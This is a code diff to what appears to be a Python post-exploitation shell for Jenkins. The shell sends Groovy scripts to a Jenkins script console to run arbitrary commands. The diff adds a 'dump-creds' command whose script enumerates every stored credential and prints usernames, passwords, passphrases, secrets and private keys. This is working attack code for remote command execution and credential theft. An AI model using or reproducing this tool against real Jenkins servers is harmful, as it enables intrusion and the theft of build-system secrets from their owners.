@@ -15,6 +15,35 @@ proc.waitForOrKill(60000)
 println "$sout$serr"
 """
 
+creds_script = r"""
+def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
+      com.cloudbees.plugins.credentials.Credentials.class
+)
+
+for (c in creds) {
+  println(c.id)
+  if (c.properties.description) {
+    println("   description: " + c.description)
+  }
+  if (c.properties.username) {
+    println("   username: " + c.username)
+  }
+  if (c.properties.password) {
+    println("   password: " + c.password)
+  }
+  if (c.properties.passphrase) {
+    println("   passphrase: " + c.passphrase)
+  }
+  if (c.properties.secret) {
+    println("   secret: " + c.secret)
+  }
+  if (c.properties.privateKeySource) {
+    println("   privateKey: " + c.getPrivateKey())
+  }
+  println("")
+}
+"""
+
 
 class Jenkins(cmd.Cmd):
     _default_prompt = "jenkins >>> "
@@ -55,10 +84,15 @@ class Jenkins(cmd.Cmd):
     def default(self, cmd):
         if cmd == "exit":
             sys.exit(0)
+        elif cmd == "EOF":
+            sys.exit(0)
+        elif cmd == "dump-creds":
+          s = creds_script
+        else:
+          s = script.format(command=self._parse_cmd(cmd))
         if self._change_dir(cmd):
             Jenkins.prompt = self._prompt()
             return
-        s = script.format(command=self._parse_cmd(cmd))
         x = requests.post(self.url, data={"script": s})
         print(x.text)
 
